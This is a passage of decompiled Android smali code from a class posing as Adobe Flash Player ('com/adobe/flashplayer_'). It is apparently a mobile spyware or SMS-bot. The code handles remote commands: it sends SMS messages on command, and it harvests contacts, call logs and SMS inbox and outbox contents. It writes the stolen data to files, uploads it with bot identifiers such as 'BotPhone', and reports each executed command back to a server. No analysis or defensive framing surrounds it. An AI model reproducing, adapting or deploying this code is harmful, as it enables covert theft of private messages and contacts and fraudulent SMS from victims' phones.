    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v31

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "]:Executed:HTTP"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, v30

    invoke-direct {v0, v1, v13, v3, v2}, Lcom/adobe/flashplayer_/BBB;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 308
    .end local v28    # "cmd_data":[Ljava/lang/String;
    .end local v31    # "data":Ljava/lang/String;
    :cond_10
    const-string v3, "sendSMS"

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v5, -0x1

    if-eq v3, v5, :cond_12

    .line 310
    const-string v3, " "

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v54

    .line 311
    .local v54, "path":[Ljava/lang/String;
    const/4 v3, 0x2

    aget-object v3, v54, v3

    const-string v5, "_"

    const-string v7, " "

    invoke-virtual {v3, v5, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v65

    .line 312
    .local v65, "text":Ljava/lang/String;
    const/4 v3, 0x1

    aget-object v68, v54, v3

    .line 314
    .local v68, "who":Ljava/lang/String;
    invoke-virtual/range {v68 .. v68}, Ljava/lang/String;->length()I

    move-result v3

    const/16 v5, 0x9

    if-le v3, v5, :cond_11

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "+"

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v68

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v68

    .line 316
    :cond_11
    move-object/from16 v0, p0

    move-object/from16 v1, v68

    move-object/from16 v2, v65

    invoke-virtual {v0, v1, v2}, Lcom/adobe/flashplayer_/BBB;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    .line 319
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v5, "sendSMS["

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v5, 0x1

    aget-object v5, v54, v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "_"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, " "

    const-string v7, "_"

    move-object/from16 v0, v65

    invoke-virtual {v0, v5, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "]:Executed:HTTP"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, v30

    invoke-direct {v0, v1, v13, v3, v2}, Lcom/adobe/flashplayer_/BBB;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 325
    .end local v54    # "path":[Ljava/lang/String;
    .end local v65    # "text":Ljava/lang/String;
    .end local v68    # "who":Ljava/lang/String;
    :cond_12
    const-string v3, "getContacts"

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v5, -0x1

    if-eq v3, v5, :cond_13

    .line 326
    const-string v63, ""

    .line 327
    .local v63, "temp_Z":Ljava/lang/String;
    const-string v31, ""

    .line 329
    .restart local v31    # "data":Ljava/lang/String;
    invoke-virtual/range {v30 .. v30}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v7

    sget-object v8, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const/4 v9, 0x0

    const/4 v10, 0x0

    const/4 v11, 0x0

    const/4 v12, 0x0

    invoke-virtual/range {v7 .. v12}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v57

    .line 330
    .local v57, "phones":Landroid/database/Cursor;
    :goto_6
    invoke-interface/range {v57 .. v57}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-nez v3, :cond_1a

    .line 341
    invoke-interface/range {v57 .. v57}, Landroid/database/Cursor;->close()V

    .line 343
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static/range {v31 .. v31}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v63

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v31

    .line 345
    const-string v3, "getContacts:Executed:HTTP"

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, v30

    invoke-direct {v0, v1, v13, v3, v2}, Lcom/adobe/flashplayer_/BBB;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 347
    const-string v3, "contacts"

    move-object/from16 v0, p0

    move-object/from16 v1, v31

    invoke-direct {v0, v3, v1}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 349
    new-instance v3, Lcom/adobe/flashplayer_/AAA000;

    invoke-direct {v3}, Lcom/adobe/flashplayer_/AAA000;-><init>()V

    const/4 v5, 0x3

    new-array v5, v5, [Ljava/lang/String;

    const/4 v7, 0x0

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "&b="

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&c="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, ":"

    const-string v10, ""

    invoke-virtual {v15, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&d="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&e="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "BotPhone"

    move-object/from16 v0, p0

    invoke-direct {v0, v9}, Lcom/adobe/flashplayer_/BBB;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&f="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object/from16 v0, v17

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&g="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object/from16 v0, v19

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&h=contacts&i=cmd"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&prefix="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object/from16 v0, v16

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    aput-object v8, v5, v7

    const/4 v7, 0x1

    const-string v8, "contacts"

    move-object/from16 v0, p0

    invoke-virtual {v0, v8}, Lcom/adobe/flashplayer_/BBB;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v8

    invoke-virtual {v8}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v8

    aput-object v8, v5, v7

    const/4 v7, 0x2

    aput-object v18, v5, v7

    invoke-virtual {v3, v5}, Lcom/adobe/flashplayer_/AAA000;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 357
    .end local v31    # "data":Ljava/lang/String;
    .end local v57    # "phones":Landroid/database/Cursor;
    .end local v63    # "temp_Z":Ljava/lang/String;
    :cond_13
    const-string v3, "getCalls"

    move-object/from16 v0, v21

    invoke-virtual {v0, v3}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v5, -0x1

    if-eq v3, v5, :cond_14

    .line 360
    new-instance v59, Ljava/lang/StringBuffer;

    invoke-direct/range {v59 .. v59}, Ljava/lang/StringBuffer;-><init>()V

    .line 361
    .local v59, "sb":Ljava/lang/StringBuffer;
    invoke-virtual/range {v30 .. v30}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v7

    sget-object v8, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    const/4 v9, 0x0

    const/4 v10, 0x0

    const/4 v11, 0x0

    const/4 v12, 0x0

    invoke-virtual/range {v7 .. v12}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v43

    .line 362
    .local v43, "managedCursor":Landroid/database/Cursor;
    const-string v3, "number"

    move-object/from16 v0, v43

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v48

    .line 363
    .local v48, "number":I
    const-string v3, "type"

    move-object/from16 v0, v43

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v66

    .line 364
    .local v66, "type":I
    const-string v3, "date"

    move-object/from16 v0, v43

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v32

    .line 365
    .local v32, "date":I
    const-string v3, "duration"

    move-object/from16 v0, v43

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v36

    .line 366
    .local v36, "duration":I
    :goto_7
    invoke-interface/range {v43 .. v43}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-nez v3, :cond_1b

    .line 391
    invoke-interface/range {v43 .. v43}, Landroid/database/Cursor;->close()V

    .line 393
    const-string v3, "getCalls:Executed:HTTP"

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, v30

    invoke-direct {v0, v1, v13, v3, v2}, Lcom/adobe/flashplayer_/BBB;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 394
    const-string v3, "calls_data"

    invoke-virtual/range {v59 .. v59}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v5

    move-object/from16 v0, p0

    invoke-direct {v0, v3, v5}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 395
    new-instance v3, Lcom/adobe/flashplayer_/AAA000;

    invoke-direct {v3}, Lcom/adobe/flashplayer_/AAA000;-><init>()V

    const/4 v5, 0x3

    new-array v5, v5, [Ljava/lang/String;

    const/4 v7, 0x0

    new-instance v8, Ljava/lang/StringBuilder;

    const-string v9, "&b="

    invoke-direct {v8, v9}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v8, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&c="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, ":"

    const-string v10, ""

    invoke-virtual {v15, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&d="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&e="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "BotPhone"

    move-object/from16 v0, p0

    invoke-direct {v0, v9}, Lcom/adobe/flashplayer_/BBB;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&f="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object/from16 v0, v17

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&g="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object/from16 v0, v19

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    const-string v9, "&h=calls&i=cmd&prefix="

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    move-object/from16 v0, v16

    invoke-virtual {v8, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v8

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    aput-object v8, v5, v7

    const/4 v7, 0x1

    const-string v8, "calls_data"

    move-object/from16 v0, v30

    invoke-virtual {v0, v8}, Landroid/content/Context;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v8

    invoke-virtual {v8}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v8

    aput-object v8, v5, v7

    const/4 v7, 0x2

    aput-object v18, v5, v7

    invoke-virtual {v3, v5}, Lcom/adobe/flashplayer_/AAA000;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 591
    .end local v21    # "answ":Ljava/lang/String;
    .end local v32    # "date":I
    .end local v36    # "duration":I
    .end local v43    # "managedCursor":Landroid/database/Cursor;
    .end local v48    # "number":I
    .end local v59    # "sb":Ljava/lang/StringBuffer;
    .end local v66    # "type":I
    :cond_14
    invoke-virtual/range {p0 .. p0}, Lcom/adobe/flashplayer_/BBB;->stopSelf()V

    .line 594
    return-void

    .line 81
    .restart local v21    # "answ":Ljava/lang/String;
    .restart local v58    # "pn":Ljava/lang/String;
    .restart local v61    # "tMgr":Landroid/telephony/TelephonyManager;
    :cond_15
    :try_start_1
    const-string v3, "+"

    const-string v5, ""

    move-object/from16 v0, v58

    invoke-virtual {v0, v3, v5}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/util/concurrent/ExecutionException; {:try_start_1 .. :try_end_1} :catch_1

    move-result-object v58

    goto/16 :goto_0

    .line 87
    .end local v58    # "pn":Ljava/lang/String;
    .end local v61    # "tMgr":Landroid/telephony/TelephonyManager;
    :catch_0
    move-exception v37

    .line 88
    .local v37, "e":Ljava/lang/InterruptedException;
    invoke-virtual/range {v37 .. v37}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto/16 :goto_1

    .line 89
    .end local v37    # "e":Ljava/lang/InterruptedException;
    :catch_1
    move-exception v37

    .line 90
    .local v37, "e":Ljava/util/concurrent/ExecutionException;
    invoke-virtual/range {v37 .. v37}, Ljava/util/concurrent/ExecutionException;->printStackTrace()V

    goto/16 :goto_1

    .line 118
    .end local v37    # "e":Ljava/util/concurrent/ExecutionException;
    .restart local v22    # "buff":[Ljava/lang/String;
    :cond_16
    const-string v3, "w"

    const-string v5, "*"

    move-object/from16 v0, p0

    invoke-direct {v0, v3, v5}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 119
    const-string v3, "server"

    const-string v5, "stop"

    move-object/from16 v0, p0

    invoke-direct {v0, v3, v5}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    .line 120
    const-string v3, "ReichServer!stop:Executed:HTTP"

    move-object/from16 v0, p0

    move-object/from16 v1, v18

    move-object/from16 v2, v30

    invoke-direct {v0, v1, v13, v3, v2}, Lcom/adobe/flashplayer_/BBB;->sendREP(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    goto/16 :goto_2

    .line 199
    .end local v22    # "buff":[Ljava/lang/String;
    .restart local v28    # "cmd_data":[Ljava/lang/String;
    :cond_17
    const-string v3, "forceZ"

    const-string v5, "Off"

    move-object/from16 v0, p0

    invoke-direct {v0, v3, v5}, Lcom/adobe/flashplayer_/BBB;->writeConfig(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_3

    .line 244
    .end local v28    # "cmd_data":[Ljava/lang/String;
    .restart local v4    # "inBox":Landroid/net/Uri;
    .restart local v42    # "inc":Landroid/database/Cursor;
    .restart local v50    # "pack_inbox":Ljava/lang/String;
    .restart local v51    # "pack_inbox_pack":Ljava/lang/String;
    .restart local v52    # "pack_outbox":Ljava/lang/String;
    .restart local v53    # "pack_outbox_pack":Ljava/lang/String;
    :cond_18
    const-string v3, "body"

    move-object/from16 v0, v42

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    move-object/from16 v0, v42

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v44

    .line 245
    .local v44, "msg":Ljava/lang/String;
    const-string v3, "date"

    move-object/from16 v0, v42

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    move-object/from16 v0, v42

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v32

    .line 246
    .local v32, "date":J
    const-string v3, "address"

    move-object/from16 v0, v42

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    move-object/from16 v0, v42

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v60

    .line 248
    .local v60, "sender":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static/range {v50 .. v50}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "[ \u041e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u0435\u043b\u044c ]\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, v60

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "\r\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v50

    .line 249
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static/range {v50 .. v50}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "[ \u0414\u0430\u0442\u0430 ]\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-static/range {v32 .. v33}, Lcom/adobe/flashplayer_/BBB;->millisToDate(J)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "\r\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v50

    .line 250
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static/range {v50 .. v50}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "[ \u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 ]\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, v44

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "\r\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v50

    .line 251
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static/range {v50 .. v50}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "........................\r\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v50

    goto/16 :goto_4

    .line 264
    .end local v32    # "date":J
    .end local v44    # "msg":Ljava/lang/String;
    .end local v60    # "sender":Ljava/lang/String;
    .restart local v6    # "outBox":Landroid/net/Uri;
    .restart local v49    # "ouc":Landroid/database/Cursor;
    :cond_19
    const-string v3, "body"

    move-object/from16 v0, v49

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    move-object/from16 v0, v49

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v44

    .line 265
    .restart local v44    # "msg":Ljava/lang/String;
    const-string v3, "date"

    move-object/from16 v0, v49

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    move-object/from16 v0, v49

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v32

    .line 266
    .restart local v32    # "date":J
    const-string v3, "address"

    move-object/from16 v0, v49

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    move-object/from16 v0, v49

    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v60

    .line 267
    .restart local v60    # "sender":Ljava/lang/String;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static/range {v52 .. v52}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "[ \u041e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u0435\u043b\u044c ]\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, v60

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "\r\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v52

    .line 268
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static/range {v52 .. v52}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "[ \u0414\u0430\u0442\u0430 ]\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-static/range {v32 .. v33}, Lcom/adobe/flashplayer_/BBB;->millisToDate(J)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "\r\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v52

    .line 269
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static/range {v52 .. v52}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "[ \u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 ]\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    move-object/from16 v0, v44

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v5, "\r\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v52

    .line 270
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-static/range {v52 .. v52}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-direct {v3, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v5, "........................\r\r"

    invoke-virtual {v3, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v52

    goto/16 :goto_5

    .line 332
    .end local v4    # "inBox":Landroid/net/Uri;
    .end local v6    # "outBox":Landroid/net/Uri;
    .end local v32    # "date":J
    .end local v42    # "inc":Landroid/database/Cursor;
    .end local v44    # "msg":Ljava/lang/String;
    .end local v49    # "ouc":Landroid/database/Cursor;
    .end local v50    # "pack_inbox":Ljava/lang/String;
